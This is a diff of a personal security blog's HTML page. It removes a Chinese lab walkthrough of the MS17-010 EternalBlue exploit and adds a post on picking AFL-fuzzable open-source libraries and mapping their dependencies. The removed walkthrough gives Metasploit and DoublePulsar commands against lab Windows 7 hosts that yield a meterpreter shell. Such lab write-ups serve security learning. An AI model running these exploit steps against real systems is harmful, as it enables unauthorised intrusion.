@@ -16,7 +16,7 @@
   <meta name="description" content="Personal Blog of Zhiyu Zhang">
   <meta name="author" content="Zhiyu Zhang">
   <meta name="keywords" content="Security, Machine Learning, Linux">
-  <title>【渗透】MS17-010漏洞复现 - Zhiyu&#39;s Blog</title>
+  <title>常见开源软件和开源库的调用关系 - Zhiyu&#39;s Blog</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
@@ -161,8 +161,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2019-11-14 19:46">
-      November 14, 2019 pm
+    <time datetime="2020-11-16 17:29">
+      November 16, 2020 pm
     </time>
   </div>
 
@@ -172,7 +172,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k words
+      566 words
     </span>
   
 
@@ -182,7 +182,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      7
        minutes
     </span>
   
@@ -222,139 +222,125 @@
             
               <p class="note note-info">
                 
-                  Last updated on：October 12, 2020 pm
+                  Last updated on：March 9, 2021 am
                 
               </p>
             
             <article class="markdown-body">
-              <h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1 漏洞原理"></a>1 漏洞原理</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><p><strong>EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。</strong></p>
-<p>从EternalBlue这个Exploit被影子经纪人公布到互联网上后，就成为了“明星”。这个Exploit被多款恶意软件利用。包括肆虐的<strong>WannaCrypt</strong>，无文件的勒索软件<strong>UIWIX</strong>和SMB蠕虫<strong>EternalRocks</strong>。</p>
+              <p>开源社区有着许多开源软件，我将优先从以下<strong>几个角度</strong>去挑选开源软件，并找寻它们之间的<strong>依赖与调用关系</strong>：</p>
 <a id="more"></a>
-<h3 id="1-2-漏洞简析"><a href="#1-2-漏洞简析" class="headerlink" title="1.2 漏洞简析"></a>1.2 漏洞简析</h3><p><strong>Eternalblue利用了3个不同的bug</strong></p>
 <ul>
-<li>第一个是内核态函数<strong>srv!SrvOs2FeaListToNt</strong>在处理FEA(File Extended Attributes)转换时，由于错误地使用的<strong>WORD强制类型转换</strong>，导致在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)的<strong>缓冲区溢出</strong>。</li>
-<li>第二个漏洞可以触发缓冲区溢出，这是由于SMB协议定义的两个子命令SMB_COM_TRANSACTION2和SMB_COM_NT_TRANSACT的差别。如果有太多的数据要包含在一个单独的包中，就需要_SECONDARY命令。TRANSACTION2和NT_TRANSACT的关键区别在于<strong>后者调用的数据包是前者大小的2倍</strong>。如果客户端使用NT_TRANSACT子命令在TRANSACTION2子命令前发送伪造的消息，就会出现验证错误。如果协议发现接收了2个分开的子命令，就会根据最后接收的包的类型来分配类型和大小。因为最后接收的包比较小，所以第一个包会占用比分配空间更多的空间。</li>
-<li>一旦攻击者完成初始的溢出，就可以利用SMB v1中的第3个漏洞来进行Heap Spraying(堆喷射)，导致在给定地址分配一块内存。然后，攻击者就可以写入和执行shellcode来控制系统。</li>
+<li><strong>支持AFL进行Fuzzing</strong>的开源软件(参考<a href="https://github.com/aflgo/oss-fuzz/tree/master/projects" target="_blank" rel="noopener">https://github.com/aflgo/oss-fuzz/tree/master/projects</a>)</li>
+<li>提供<strong>文件操作API</strong>或者<strong>网络通信API</strong>的开源工具。因为它们所涉及的<strong>文件读取</strong>和<strong>通信协议栈</strong>往往更容易产生crash</li>
+<li>体积不大，<strong>易于源码安装</strong></li>
 </ul>
-<h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2 漏洞复现"></a>2 漏洞复现</h2><h3 id="2-1-渗透Windows7-32-bit"><a href="#2-1-渗透Windows7-32-bit" class="headerlink" title="2.1 渗透Windows7 32-bit"></a>2.1 渗透Windows7 32-bit</h3><h4 id="2-1-1-实验环境"><a href="#2-1-1-实验环境" class="headerlink" title="2.1.1 实验环境"></a>2.1.1 实验环境</h4><p><strong>实验平台：</strong></p>
+<h2 id="1-开源软件挑选"><a href="#1-开源软件挑选" class="headerlink" title="1 开源软件挑选"></a>1 开源软件挑选</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> yaml
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkAflSupport</span><span class="hljs-params">(dirname)</span>:</span>
+    <span class="hljs-keyword">try</span>:
+        f = open(dirname + <span class="hljs-string">'/project.yaml'</span>, <span class="hljs-string">'r'</span>)
+        data = yaml.load(f)
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-comment"># print('there is no project.yaml in %s' %dirname)</span>
+        <span class="hljs-keyword">pass</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">if</span> <span class="hljs-string">'afl'</span> <span class="hljs-keyword">in</span> data[<span class="hljs-string">'fuzzing_engines'</span>]:
+            toolname = dirname.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]
+            print(toolname)
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-comment"># print('there is no fuzzing_engines given')</span>
+        <span class="hljs-keyword">pass</span>
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    proj_dir = <span class="hljs-string">'./projects'</span>
+    projects = os.listdir(proj_dir)
+
+    <span class="hljs-keyword">for</span> proj_name <span class="hljs-keyword">in</span> projects:
+        <span class="hljs-keyword">if</span> os.path.isdir(proj_dir + <span class="hljs-string">'/'</span> + proj_name):
+            checkAflSupport(proj_dir + <span class="hljs-string">'/'</span> + proj_name)</code></pre></div>
+<p>采用<code>parseFuzzProj.py</code>脚本拉取<a href="https://github.com/aflgo/oss-fuzz/tree/master/projects" target="_blank" rel="noopener">oss-fuzz</a>中支持AFL的开源软件，得到如下软件列表：</p>
+<div class="hljs"><pre><code class="hljs bash">binutils brotli brunsli bzip2
+c-ares capstone cjson cmark
+graphicsmagick grok harfbuzz
+hermes hostap
+jbig2dec json-c
+lcms libcbor libexif libfdk-aac libidn2 libldac libpcap libplist libspectre libtasn1 libteken libwebp libxml2 libyaml libyuv lz4
+miniz monero mupdf
+nanopb ndpi nestegg nghttp2 ntp
+openjpeg openthread opus ots
+pcre2 pffft proxygen
+qubes-os
+rnp
+speex stb
+tidy-html5 tor tremor
+unicorn usrsctp
+vorbis
+wireshark woff2 wolfssl wuffs
+xz
+yajl-ruby
+zlib zlib-ng zstd</code></pre></div>
+<p><strong>挑选与文件操作和网络通信相关的开源软件：</strong></p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 文件操作相关的开源软件</span>
+binutils bzip2
+grok
+libyaml libxml2 libjson-c3
+xz
+zlib
+
+<span class="hljs-comment"># 网络通信相关的开源软件</span>
+fastnetmon
+libpcap libndpi 
+wireshark</code></pre></div>
+<h2 id="2-软件依赖关系查找"><a href="#2-软件依赖关系查找" class="headerlink" title="2 软件依赖关系查找"></a>2 软件依赖关系查找</h2><p><strong>软件之间的调用关系即依赖关系</strong>，我们可以借助包管理工具<code>apt</code>来查找开源软件的<strong>依赖有哪些</strong>以及<strong>被哪些软件依赖</strong>：</p>
 <ul>
-<li>带有MS17-010漏洞的Windows 7 pro x86， 内部版本7601<ul>
-<li><strong>IP：192.168.188.136</strong></li>
+<li><p>查询镜像源是否有某款开源软件<code>SOFTWARE</code>：</p>
+<div class="hljs"><pre><code class="hljs bash">sudo apt-cache search SOFTWARE_NAME | grep SOFTWARE_NAME</code></pre></div>
+</li>
+<li><p>查询某款开源软件<code>SOFTWARE</code>的依赖：</p>
+<div class="hljs"><pre><code class="hljs bash">sudo apt-cache depends SOFTWARE_NAME | grep Depends</code></pre></div>
+</li>
+<li><p>查询某款开源软件<code>SOFTWARE</code>被哪些软件依赖：</p>
+<div class="hljs"><pre><code class="hljs bash">sudo apt-cache rdepends SOFTWARE_NAME</code></pre></div>
+</li>
+</ul>
+<h2 id="3-开源软件依赖组合分析"><a href="#3-开源软件依赖组合分析" class="headerlink" title="3 开源软件依赖组合分析"></a>3 开源软件依赖组合分析</h2><h3 id="3-1-libpcap"><a href="#3-1-libpcap" class="headerlink" title="3.1 libpcap"></a>3.1 libpcap</h3><h4 id="依赖与被依赖"><a href="#依赖与被依赖" class="headerlink" title="依赖与被依赖"></a>依赖与被依赖</h4><p><strong>depends：</strong></p>
+<ul>
+<li>libc6</li>
+</ul>
+<p><strong>rdepends：</strong></p>
+<ul>
+<li>wireshark-qt，wireshark-gtk，tshark</li>
+<li>tcpdump，tcpreplay</li>
+<li>snort，suricata，fastnetmon</li>
+<li>nmap</li>
+</ul>
+<h4 id="代码相似性"><a href="#代码相似性" class="headerlink" title="代码相似性"></a>代码相似性</h4><ul>
+<li><strong>与Nmap：</strong><ul>
+<li>netmap/libpcap与libpcap仓库下有大量同名.c代码文件，且有若干同名目录</li>
 </ul>
 </li>
-<li>Kali Linux，用于渗透<ul>
-<li><strong>IP：192.168.188.135</strong></li>
+</ul>
+<p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20201116221441.png" srcset="/img/loading.gif"></p>
+<ul>
+<li><p><strong>与suricata：</strong></p>
+<ul>
+<li>source-pcap.c中存在libpcap的API调用</li>
+</ul>
+</li>
+<li><p><strong>与wireshark：</strong></p>
+<ul>
+<li>wireshark/writecap/pcapio.c存在libpcap magic number等相关字段和结构体</li>
+<li>wireshark/capture_opts.c</li>
 </ul>
 </li>
 </ul>
-<p><strong>实验配置：</strong></p>
-<p>kali没有32位机器的渗透模块，我们需要做以下配置</p>
-<ul>
-<li><strong>安装wine 32</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>
-dpkg --add-architecture i386
-apt-get update
-apt-get install wine32</code></pre></div>
-<ul>
-<li><strong>拉取EternalBlue_Doublepulsar攻击模块</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
-
-<span class="hljs-comment"># 将模块拷贝到msf的相应目录</span>
-<span class="hljs-built_in">cd</span> Eternalblue-Doublepulsar-metasploit
-cp -r deps/ eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></pre></div>
-<ul>
-<li><strong>运行postgresql</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">service postgresql start</code></pre></div>
-<h4 id="2-1-2-信息搜集"><a href="#2-1-2-信息搜集" class="headerlink" title="2.1.2 信息搜集"></a>2.1.2 信息搜集</h4><ul>
-<li><strong>nmap扫描</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>
-namp -sS -sV -Pn 192.168.188.136</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191107174140.png" srcset="/img/loading.gif" alt></p>
-<p>发现该win7开放了445端口，可进一步采用msfconsole进行扫描分析</p>
-<ul>
-<li><strong>查看并使用辅助扫描模块测试目标是否可攻击</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行msfconsole工具</span>
-msfconsole
-
-<span class="hljs-comment"># 搜索ms17-010相关模块，并采用辅助模块进行测试</span>
-search ms17-010
-
-<span class="hljs-comment"># 发现有一个ms17_010的扫描检测模块可用, use</span>
-use auxiliary/scanner/smb/smb_ms17_010</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164105.png" srcset="/img/loading.gif" alt></p>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 设置RHOSTS项为192.168.188.136</span>
-<span class="hljs-built_in">set</span> RHOSTS 192.168.188.136
-
-<span class="hljs-comment"># 运行该ms17_010检测模块</span>
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164829.png" srcset="/img/loading.gif" alt></p>
-<p><strong>发现确实目标机器存在MS17-010，并提示可用之前git clone的DoublePulsar模块进行侵入</strong></p>
-<h4 id="2-1-3-开始渗透"><a href="#2-1-3-开始渗透" class="headerlink" title="2.1.3 开始渗透"></a>2.1.3 开始渗透</h4><ul>
-<li><strong>尝试攻击</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 使用doublepulsar攻击模块</span>
-use exploit/windows/smb/eternalblue_doublepulsar
-
-<span class="hljs-comment"># 设置RHOST项为192.168.188.136</span>
-<span class="hljs-built_in">set</span> RHOST 192.168.188.136
-
-<span class="hljs-comment"># 查看攻击模块的配置，请特别注意DOUBLEPULSARPATH是否与你git clone下载的路径一致</span>
-show options</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109170635.png" srcset="/img/loading.gif" alt></p>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行攻击模块</span>
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171143.png" srcset="/img/loading.gif" alt></p>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 渗透并没有成功，修改PROCESSINJECT项为explorer.exe (修改为lsass.exe也可以)</span>
-<span class="hljs-built_in">set</span> PROCESSINJECT explorer.exe
-
-<span class="hljs-comment"># 再次exploit，成功</span>
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171502.png" srcset="/img/loading.gif" alt></p>
-<p><strong>meterpreter</strong>是一个为攻击者提供交互性shell以便于在目标机器上执行代码的命令行工具。渗透成功的后续攻击可以参考阅读<a href="https://qgrain.github.io/2019/11/14/渗透-通过meterpreter进行提权/">【渗透】meterpreter提权</a></p>
-<h3 id="2-2-渗透Windows7-64-bit"><a href="#2-2-渗透Windows7-64-bit" class="headerlink" title="2.2 渗透Windows7 64-bit"></a>2.2 渗透Windows7 64-bit</h3><p>相比于渗透Windows7 32-bit，渗透64位机器要简单得多，因为64位机器的渗透是msf内建支持的。</p>
-<p><strong><em>前几个步骤基本和渗透32位机器一致</em></strong></p>
-<h4 id="2-2-1-信息搜集"><a href="#2-2-1-信息搜集" class="headerlink" title="2.2.1 信息搜集"></a>2.2.1 信息搜集</h4><ul>
-<li><strong>nmap扫描主机信息</strong></li>
-<li><strong>msfconsole采用scanner模块扫描检测ms17-010漏洞</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010
-<span class="hljs-built_in">set</span> RHOSTS 192.168.188.138 <span class="hljs-comment"># Windows 7 x64</span>
-show options
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114113425.png" srcset="/img/loading.gif" alt></p>
-<h4 id="2-2-2开始渗透"><a href="#2-2-2开始渗透" class="headerlink" title="2.2.2开始渗透"></a>2.2.2开始渗透</h4><ul>
-<li><strong>方法一：采用msf自带的eternalblue攻击模块</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue
-<span class="hljs-built_in">set</span> RHOST 192.168.188 138 <span class="hljs-comment"># Windows 7 x64</span>
-show options
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114114152.png" srcset="/img/loading.gif" alt></p>
-<p>成功拿到目标机器的Shell</p>
-<ul>
-<li><strong>方法二：采用github开源攻击模块DoublePulsar</strong></li>
-</ul>
-<p>步骤和攻击32位机器一致，但是需要配置<a href>wine64和wine32共存</a></p>
-
+<h2 id="TODO…"><a href="#TODO…" class="headerlink" title="TODO…"></a>TODO…</h2>
             </article>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/Bug/">Bug</a>
-                    
-                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
-                    
-                  </div>
                 
               </div>
               
@@ -365,18 +351,12 @@ run</code></pre></div>
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2019/11/14/渗透-meterpreter命令详解/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【渗透】meterpreter命令详解</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2019/10/22/Iptables-1/">
-                        <span class="hidden-mobile">Iptables(1)</span>
+                      <a href="/2020/10/21/AFLGO安装与使用/">
+                        <span class="hidden-mobile">AFLGO安装与使用</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -625,7 +605,7 @@ run</code></pre></div>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "【渗透】MS17-010漏洞复现&nbsp;",
+        "常见开源软件和开源库的调用关系&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 80,
